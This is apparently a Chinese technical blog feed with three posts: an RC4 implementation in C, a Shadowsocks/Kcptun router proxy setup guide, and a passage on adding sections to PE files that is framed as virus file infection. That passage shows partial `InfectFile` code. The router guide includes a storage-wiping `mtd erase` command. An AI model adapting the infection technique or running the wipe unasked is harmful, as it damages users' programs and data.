_SYS_CRYPTO_RC4_RC4_H_</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> &#123;</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  perm[<span class="number">256</span>];</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index1;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  index2;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span>;</div><div class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_bytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a, <span class="keyword">unsigned</span> <span class="keyword">char</span> *b)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> temp;</div><div class="line">    temp = *a;</div><div class="line">    *a = *b;</div><div class="line">    *b = temp;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Initialize an RC4 state buffer using the supplied key,</div><div class="line">* which can have arbitrary length.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">int</span> keylen)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line"></div><div class="line">    <span class="comment">/* Initialize state with identity permutation */</span></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</div><div class="line">        state-&gt;perm[i] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)i;</div><div class="line">    state-&gt;index1 = <span class="number">0</span>;</div><div class="line">    state-&gt;index2 = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Randomize the permutation using key data */</span></div><div class="line">    <span class="keyword">for</span> (j = i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">        j = (j + state-&gt;perm[i] + key[i % keylen]) % <span class="number">256</span>;</div><div class="line">        swap_bytes(&amp;state-&gt;perm[i], &amp;state-&gt;perm[j]);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">* Encrypt some data using the supplied RC4 state buffer.</div><div class="line">* The input and output buffers may be the same buffer.</div><div class="line">* Since RC4 is a stream cypher, this function is used</div><div class="line">* for both encryption and decryption.</div><div class="line">*/</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(struct rc4_state *<span class="keyword">const</span> state,</span></span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *inbuf, <span class="keyword">unsigned</span> <span class="keyword">char</span> *outbuf, <span class="keyword">int</span> buflen)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buflen; i++) &#123;</div><div class="line"></div><div class="line">        <span class="comment">/* Update modification indicies */</span></div><div class="line">        state-&gt;index1 = (state-&gt;index1 + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">        state-&gt;index2 = (state-&gt;index2 + state-&gt;perm[state-&gt;index1]) % <span class="number">256</span>;</div><div class="line"></div><div class="line">        <span class="comment">/* Modify permutation */</span></div><div class="line">        swap_bytes(&amp;state-&gt;perm[state-&gt;index1], &amp;state-&gt;perm[state-&gt;index2]);</div><div class="line"></div><div class="line">        <span class="comment">/* Encrypt/decrypt next byte */</span></div><div class="line">        j = (state-&gt;perm[state-&gt;index1] + state-&gt;perm[state-&gt;index2]) % <span class="number">256</span>;</div><div class="line">        outbuf[i] = inbuf[i] ^ state-&gt;perm[j];</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure>
<h4 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a><strong>2）测试</strong></h4><p>使用以下代码进行测试加密和解密的结果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"RC4.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 50</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> plaintext[LEN] = &#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> crypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> decrypt[LEN]&#123; <span class="number">0</span> &#125;;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[LEN] = <span class="string">"1234567890"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rc4_state</span> <span class="title">state</span>;</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, plaintext);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"plaintext:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, plaintext[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, plaintext, crypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ncrypt:\n"</span>);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c,"</span>, crypt[i]);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n\ndecrypt: \n"</span>);</div><div class="line">        rc4_init(&amp;state, key, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)key));<span class="comment">// this code is very important</span></div><div class="line">        rc4_crypt(&amp;state, crypt, decrypt, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext));</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)plaintext); i++) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c "</span>, decrypt[i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n-------------------------------------------------\n\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/17-9-19/88889666.jpg" alt=""></p>
<hr>
<p>References:<br>[1] <a href="https://en.wikipedia.org/wiki/RC4" target="_blank" rel="external">RC4</a><br>[2] <a href="http://gttiankai.github.io/2015/01/18/Rc4.html" target="_blank" rel="external">流加密RC4的C语言实现</a><br>[3] <a href="http://www.cnblogs.com/zibility/p/5404478.html" target="_blank" rel="external">RC4加密算法</a></p>
]]></content>
      
        <categories>
            
            <category> 加密解密 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RC4 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在斐讯 K2 上部署 Shadowsocks+Kcptun]]></title>
      <url>/%E5%9C%A8%E6%96%90%E8%AE%AF%20K2%20%E4%B8%8A%E5%AE%89%E8%A3%85%20kcptun/</url>
      <content type="html"><![CDATA[<p>对于程序员来说，能顺畅使用互联网能够很大程度地提高工作效率。所以，通过 SS 来实现代理上网是一个很好的解决方案。此外，对于能使用校园网的学生党而言，还可以使用 SS + IPv6 来实现免流，这样就能把省下来的网费用来买VPS了。</p>
<p>然而，在 PC 上直接使用客户端软件代理上网有以下缺点：<br>1）不能实现全局流量的代理功能，只有支持代理功能的应用才能通过 SS 代理上网。虽然有相关的软件可以实现全局流量代理，但这样就很不方便，为了代理上网要多开好几个应用。<br>2）如果手机等其他设备也想使用代理，也必须得用客户端才能行。</p>
<p>为了能方便地在多个终端使用代理，可以在路由器上部署 SS 客户端，那么经过这台路由器的所有流量都能走代理，对于终端设备上的所有应用而言，代理是透明的。</p>
<h3 id="0x01-前提条件"><a href="#0x01-前提条件" class="headerlink" title="0x01 前提条件"></a><strong>0x01 前提条件</strong></h3><p>首先需要一台已部署好 Shadowsocks 和 Kcptun 的 VPS，服务器上安装 SS 和 Kcptun 相对要简单一些，可以在网络上能找到脚本实现一键安装。安装好之后在 PC 上安装相应的客户端软件，设置好参数并测试服务端能否正常使用。</p>
<p>下面是在斐讯 K2 上部署 SS 和 Kcptun 的过程。</p>
<h3 id="0x02-部署-SS"><a href="#0x02-部署-SS" class="headerlink" title="0x02 部署 SS"></a><strong>0x02 部署 SS</strong></h3><h4 id="1）安装软件包"><a href="#1）安装软件包" class="headerlink" title="1）安装软件包"></a><strong>1）安装软件包</strong></h4><p>透明代理使用 Shadowsocks-libev 和 ChinDNS（可不配置） 实现。使用 ssh 登陆路由器，安装相关软件包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">opkg update</div><div class="line">opkg install shadowsocks-libev luci-app-shadowsocks ChinaDNS luci-app-chinadns --force-checksum</div></pre></td></tr></table></figure></p>
<h4 id="2）更新-chnroute-表"><a href="#2）更新-chnroute-表" class="headerlink" title="2）更新 chnroute 表"></a><strong>2）更新 chnroute 表</strong></h4><p>使用以下命令更新：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -O- &apos;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&apos; | awk -F\| &apos;/CN\|ipv4/ &#123; printf(&quot;%s/%d\n&quot;, $4, 32-log($5)/log(2)) &#125;&apos; &gt; /etc/chnroute.txt</div></pre></td></tr></table></figure></p>
<h4 id="3）配置SS"><a href="#3）配置SS" class="headerlink" title="3）配置SS"></a><strong>3）配置SS</strong></h4><p>首先根据 SS 服务器中已设参数配置好 SS 的全局设置，包括以下参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器地址：2607:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx  # 校园网 IPV6 免流</div><div class="line">服务器端口: 443</div><div class="line">密码：xxxxxx</div><div class="line">加密方式：aes-256-cfb</div></pre></td></tr></table></figure></p>
<p>配置透明代理：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">端口：1081</div><div class="line">忽略列表：/etc/chnroute.txt（如果使用全局代理则留空）</div><div class="line">代理协议：TCP+UDP</div></pre></td></tr></table></figure></p>
<p>配置UDP转发（ss-tunnel）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UDP本地端口：1153</div><div class="line">UDP转发地址：8.8.8.8:53</div></pre></td></tr></table></figure></p>
<p>配置 ChinaDNS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Enable Bidirectional Filter：启用</div><div class="line">Enable DNS compression pointer：启用</div><div class="line">本地端口：1053  //不能与ss-tunnel冲突</div><div class="line">CHNRoute File：/etc/chnroute.txt</div><div class="line">Upstream Servers：223.5.5.5,127.0.0.1:1153 //第一个是阿里DNS，第二个为 ss-tunnel 转发后的 Google DNS</div></pre></td></tr></table></figure></p>
<p>配置DHCP/DNS：<br>依次点击 <code>网络 -&gt; DHCP/DNS -&gt; 服务器设置</code> 进行设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">一般配置</div><div class="line">DNS转发：127.0.0.1#1053</div><div class="line"></div><div class="line">HOSTS和解析文件</div><div class="line">忽略解析文：启用</div></pre></td></tr></table></figure></p>
<p>具体流程为， ss-tunnel 将 GoogleDNS(8.8.8.8:53) 转发到 127.0.0.1:1153 上，然后通过 ChinaDNS 与国内 DNS 组合成新的 127.0.0.1:1053，从而实现了国内外分流。</p>
<h3 id="0x03-部署-Kcptun"><a href="#0x03-部署-Kcptun" class="headerlink" title="0x03 部署 Kcptun"></a><strong>0x03 部署 Kcptun</strong></h3><h4 id="1）-安装客户端"><a href="#1）-安装客户端" class="headerlink" title="1） 安装客户端"></a><strong>1） 安装客户端</strong></h4><p>Kcptun 部署需要确保服务端和客户端版本的一致性，只有版本一致才能正常使用。首先<br>在 <a href="https://github.com/xtaci/kcptun/releases" target="_blank" rel="external">kcptun项目</a> 中下载相应版本的客户端，这里下载 <a href="https://github.com/xtaci/kcptun/releases/download/v20170525/kcptun-linux-mipsle-20170525.tar.gz" target="_blank" rel="external">kcptun-linux-mipsle-20170525.tar.gz</a>，解压后将 client_linux_mipsle 上传至路由器中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scp client_linux_mipsle root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>:/root/kcptun/client_linux_mipsle</div></pre></td></tr></table></figure></p>
<p>若提示以下内存不足错误将导致传输失败，可使用<code>mtd -r erase rootfs_data</code>命令清除设备中的所有数据以腾出内存空间，<strong><em>但这样做会导致配置信息丢失</em></strong>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">No space left on device openwrt</div></pre></td></tr></table></figure></p>
<p>传输完成后修改 /etc/rc.local 设置 kcptun 为开机启动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Put your custom commands here that should be executed once</span></div><div class="line"><span class="comment"># the system init finished. By default this file does nothing.</span></div><div class="line"></div><div class="line"><span class="comment"># IPv4</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r xxx.xxx.xxx.xxx:<span class="number">9523</span> -key xxxxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div><div class="line"></div><div class="line"><span class="comment"># or IPv6</span></div><div class="line">/root/kcptun/client_linux_mipsle -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8388</span> -r [xx:xx:xx:xx:xx:xx:xx:xx]:<span class="number">9523</span> -key xxxxxx -mtu <span class="number">1350</span> -sndwnd <span class="number">512</span> -rcvwnd <span class="number">512</span> -mode fast2 -crypt aes<span class="number">-192</span> -nocomp true &gt; /root/kcptun/kcptun.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</div><div class="line"></div><div class="line">exit <span class="number">0</span></div></pre></td></tr></table></figure></p>
<p>注释：<br>/root/kcptun/client_linux_mipsle：client_linux_mipsle的绝对路径<br>-l：kcptun 本地监听的端口<br>-r：kcptun 服务器地址（可设置为 IPv6）和端口<br>-key：kcptun的通讯密钥</p>
<p>修改 SS 客户端服务器 IP 和端口，密码等其他参数仍为原 SS 的参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务器地址：127.0.0.1</div><div class="line">服务器端口: 8388</div></pre></td></tr></table></figure></p>
<p>重启路由器后测试能否访问 Google。</p>
<h4 id="2）安装-kcptun-web-管理界面"><a href="#2）安装-kcptun-web-管理界面" class="headerlink" title="2）安装 kcptun web 管理界面"></a><strong>2）安装 kcptun web 管理界面</strong></h4><p>此外，还可以安装 <a href="https://github.com/kuoruan/luci-app-kcptun" target="_blank" rel="external">Kcptun 的 web 管理界面</a>。</p>
<hr>
<p>References:<br>[1] <a href="http://www.right.com.cn/forum/thread-202060-1-1.html" target="_blank" rel="external">在openwrt上部署kcptun给搬瓦工加速看1080p</a><br>[2] <a href="https://keyin.me/2017/02/07/Pandorabox-transparent-proxy/" target="_blank" rel="external">Pandorabox之透明代理</a><br>[3] <a href="https://blog.kuoruan.com/102.html" target="_blank" rel="external">Kcptun加速方案</a><br>[4] <a href="http://www.bwgcn.xyz/?p=159" target="_blank" rel="external">如何用Kcptun给Shadowsocks加速？</a><br>[5] <a href="https://blog.kuoruan.com/113.html" target="_blank" rel="external">OpenWrt 平台 Kcptun 管理界面 lui-app-kcptun</a><br>[6] <a href="http://aes.jypc.org/?p=19339" target="_blank" rel="external">Openwrt华硕固件Kcptun配置使用教程</a></p>
]]></content>
      
        <categories>
            
            <category> Others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 斐讯 K2 </tag>
            
            <tag> Shadowsocks </tag>
            
            <tag> kcptun，IPv6 免流 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PE文件中添加节区]]></title>
      <url>/PE%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%8A%82%E5%8C%BA/</url>
      <content type="html"><![CDATA[<p>在没有源码的情况下，如果想要修改程序或者给程序添加功能，那么就可以通过打补丁的方式来实现。此外，恶意代码为了隐藏自身会将代码注入到目标系统的合法程序中，该行为被称为恶意代码的感染性。</p>
<p>打补丁和病毒感染文件都是对目标程序的 PE 文件进行操作，由于 PE 文件每个节区在磁盘中的对齐单位为 0x200 字节，所以每个节区间可能会存在空隙，如果补丁代码或病毒需注入的代码量较少时，可以把代码写入到这些空隙中。对于恶意代码而言，以这种方式感染目标文件更具隐蔽性。</p>
<p>当补丁代码或病毒需注入的代码量较大时，可以在 PE 文件的末尾添加一个节区用于存储这些代码。下面介绍如何在 PE 文件中添加一个节区。</p>
<h3 id="0x01-手动添加"><a href="#0x01-手动添加" class="headerlink" title="0x01 手动添加"></a><strong>0x01 手动添加</strong></h3><p>使用 C32asm 可以很方便地定位并修改 PE 文件的各个字段，点击 “查看” / “PE信息” 可打开 PE 结构字段的解析面板。添加节区的具体流程如下。</p>
<h4 id="1）添加一个-IMAGE-SECTION-HEADER"><a href="#1）添加一个-IMAGE-SECTION-HEADER" class="headerlink" title="1）添加一个 IMAGE_SECTION_HEADER"></a><strong>1）添加一个 IMAGE_SECTION_HEADER</strong></h4><p>首先在原来节表的末尾添加一个节表，IMAGE_SECTION_HEADER 结构体中要设置的字段有以下6个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Name: .new</div><div class="line">VirtualSize: 0x450 // 该字段可不用对齐</div><div class="line">VirtualAddress: 0x9000 // 上一节区的 VirtualAddress + 对齐后的 VirtualSize</div><div class="line">SizeOfRawData: 0x600 // 该字段为对齐后的值</div><div class="line">PointerToRawData: 0x5200 // 上一节区的 PointerToRawData + SizeOfRawData</div><div class="line">Characteristics：0x60000020  // 与 .text段一致</div></pre></td></tr></table></figure></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/52134100.jpg" alt=""></p>
<h4 id="2）修改-NumberOfSection"><a href="#2）修改-NumberOfSection" class="headerlink" title="2）修改 NumberOfSection"></a><strong>2）修改 NumberOfSection</strong></h4><p>添加一个节表之后需要修改 IMAGE_FILE_HEADER 中的 NumberOfSection 字段，将节区数量由 4 改为 5。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/41073536.jpg" alt=""></p>
<h4 id="3）修改-SizeOfImage"><a href="#3）修改-SizeOfImage" class="headerlink" title="3）修改 SizeOfImage"></a><strong>3）修改 SizeOfImage</strong></h4><p>接着修改文件映像大小，即 IMAGE_OPTIONAL_HEADER 中的 SizeOfImage 字段，该字段按内存对齐方式对齐，在原大小（0x9000）的基础上加上新节区的大小（0x450），对齐后为 0xa000。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/28635670.jpg" alt=""></p>
<h4 id="4）添加节区数据"><a href="#4）添加节区数据" class="headerlink" title="4）添加节区数据"></a><strong>4）添加节区数据</strong></h4><p>最后添加新增节区的数据，把光标移到文件的末尾，点击 “编辑” / “插入数据”，插入数据大小为 1536(0x600)，使用 00 填充，点击确认，保存即可。</p>
<p>到此，已成功添加了一个节区，修改之后的程序仍是可运行的，使用 PEview 查看新增节区如下：<br><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/90730788.jpg" alt=""></p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-7-21/63364761.jpg" alt=""></p>
<p>这里需要注意插入数据的大小要按磁盘对齐方式对齐，不然最终修改后的文件无法运行，并提示“该文件不是有效的 Win32 应用程序”。</p>
<h3 id="0x02-编程实现"><a href="#0x02-编程实现" class="headerlink" title="0x02 编程实现"></a><strong>0x02 编程实现</strong></h3><p>恶意代码为了实现其隐蔽性，在其感染 PE 文件时会将代码执行权交给被插入的代码，所以恶意代码通常会先被执行，执行完后再跳转至原 PE 文件中的代码继续执行。</p>
<p>添加节区主要通过内存映射文件和 PE 操作完成，将文件映射到内存中后可以通过内存指针方便地访问文件。下面主要介绍添加新节区的代码实现。</p>
<h4 id="1）将文件映射到内存"><a href="#1）将文件映射到内存" class="headerlink" title="1）将文件映射到内存"></a><strong>1）将文件映射到内存</strong></h4><p>首先用 CreateFile() 打开文件，然后使用 CreateFileMapping() 和 MapViewOfFile() 函数把文件映射到内存中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( hFile  == INVALID_HANDLE_VALUE)&#123;</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	HANDLE hMapFile = CreateFileMapping(hFile,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!hMapFile)&#123;</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</div><div class="line">	<span class="keyword">if</span> (!pHdr)&#123;</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>CreateFileMapping() 函数定义如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function">HANDLE WINAPI <span class="title">CreateFileMapping</span><span class="params">(</span></span></div><div class="line">	HANDLE                hFile,  <span class="comment">//handle to the file</span></div><div class="line">	LPSECURITY_ATTRIBUTES lpAttributes, <span class="comment">//pointer to SECURITY_ATTRIBUTES structure</span></div><div class="line">	DWORD                 flProtect,  <span class="comment">//page protection of the file mapping object</span></div><div class="line">	DWORD                 dwMaximumSizeHigh,</div><div class="line">	DWORD                 dwMaximumSizeLow,</div><div class="line">	LPCTSTR               lpName</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>MapViewOfFile() 函数定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function">LPVOID WINAPI <span class="title">MapViewOfFile</span><span class="params">(</span></span></div><div class="line">	HANDLE hFileMappingObject,  <span class="comment">//handle to a file mapping object</span></div><div class="line">	DWORD  dwDesiredAccess, <span class="comment">//type of access to a file mapping object</span></div><div class="line">	DWORD  dwFileOffsetHigh,</div><div class="line">	DWORD  dwFileOffsetLow,</div><div class="line">	SIZE_T dwNumberOfBytesToMap <span class="comment">//number of bytes of a file mapping to map to the view</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="2）检查-PE-文件"><a href="#2）检查-PE-文件" class="headerlink" title="2）检查 PE 文件"></a><strong>2）检查 PE 文件</strong></h4><p>文件映射后要检查是否为有效的 PE 文件，同时为了避免重复感染，需要检查目标文件是否已被感染。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function">BOOL <span class="title">InfectFile</span><span class="params">(TCHAR *fpath)</span></span></div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 判断是否为正常PE文件</span></div><div class="line">	<span class="keyword">if</span> (!IsPeFile(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="comment">//判断是否已被感染</span></div><div class="line">	<span class="keyword">if</span> (IsInfected(pHdr))&#123;</div><div class="line">		UnmapViewOfFile(pHdr);</div><div class="line">		CloseHandle(hMapFile);</div><div class="line">		CloseHandle(hFile);</div><div class="line">		<span class="keyword">return</span> FALSE;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
